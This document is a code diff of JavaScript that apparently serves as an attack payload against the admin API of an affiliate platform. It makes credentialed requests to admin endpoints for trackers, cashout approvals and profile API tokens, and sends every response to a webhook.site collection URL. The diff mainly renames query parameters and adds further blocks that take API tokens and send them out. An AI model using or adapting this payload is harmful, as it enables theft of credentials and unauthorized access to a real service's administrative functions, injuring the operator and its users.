@@ -37,14 +37,14 @@ fetch('https://affiliates-api.ggpartners.com/api2/admin/trackers/list', {
 .then(response => {
   if (!response.ok) {
     var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ap="+response.status, false ); // false for synchronous request
     xmlHttp.send( null );
       throw new Error(`HTTP error! status: ${response.status}`);
     }
   a = response.json(); // Parse the JSON response from the server
  const jsonString = JSON.stringify(a );
   var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ap="+jsonString, false ); // false for synchronous request
     xmlHttp.send( null );
     return xmlHttp.responseText;
 })
@@ -74,14 +74,14 @@ fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/appro
 .then(response => {
   if (!response.ok) {
     var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ar="+response.status, false ); // false for synchronous request
     xmlHttp.send( null );
       throw new Error(`HTTP error! status: ${response.status}`);
     }
   a = response.json(); // Parse the JSON response from the server
  const jsonString = JSON.stringify(a );
   var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ar="+jsonString, false ); // false for synchronous request
     xmlHttp.send( null );
     return xmlHttp.responseText;
 })
@@ -110,14 +110,14 @@ fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/appro
 .then(response => {
   if (!response.ok) {
     var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ao="+response.status, false ); // false for synchronous request
     xmlHttp.send( null );
       throw new Error(`HTTP error! status: ${response.status}`);
     }
   a = response.json(); // Parse the JSON response from the server
  const jsonString = JSON.stringify(a );
   var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ak="+jsonString, false ); // false for synchronous request
     xmlHttp.send( null );
     return xmlHttp.responseText;
 })
@@ -247,7 +247,7 @@ xmlHttp.withCredentials = true;
     xmlHttp.send( null );
 
 var xmlHttp1 = new XMLHttpRequest();
-    xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?a="+xmlHttp.responseText, false ); // false for synchronous request
+    xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?ga="+xmlHttp.responseText, false ); // false for synchronous request
     xmlHttp1.send( null );
 
 var xmlHttp2 = new XMLHttpRequest();
@@ -256,5 +256,23 @@ xmlHttp2.withCredentials = true;
     xmlHttp2.send( null );
 
 var xmlHttp3 = new XMLHttpRequest();
-    xmlHttp3.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?a="+xmlHttp2.responseText, false ); // false for synchronous request
+    xmlHttp3.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?ka="+xmlHttp2.responseText, false ); // false for synchronous request
+    xmlHttp3.send( null );
+
+var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://affiliates-api.ggpartners.com/api2/dmin/profile/api_tokens", false );
+xmlHttp.withCredentials = true;
+    xmlHttp.send( null );
+
+var xmlHttp1 = new XMLHttpRequest();
+    xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?oa="+xmlHttp.responseText, false ); // false for synchronous request
+    xmlHttp1.send( null );
+
+var xmlHttp2 = new XMLHttpRequest();
+    xmlHttp2.open( "GET", "https://affiliates-api.ggpartners1.com/api2/admin/profile/api_tokens", false );
+xmlHttp2.withCredentials = true;
+    xmlHttp2.send( null );
+
+var xmlHttp3 = new XMLHttpRequest();
+    xmlHttp3.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?ma="+xmlHttp2.responseText, false ); // false for synchronous request
     xmlHttp3.send( null );
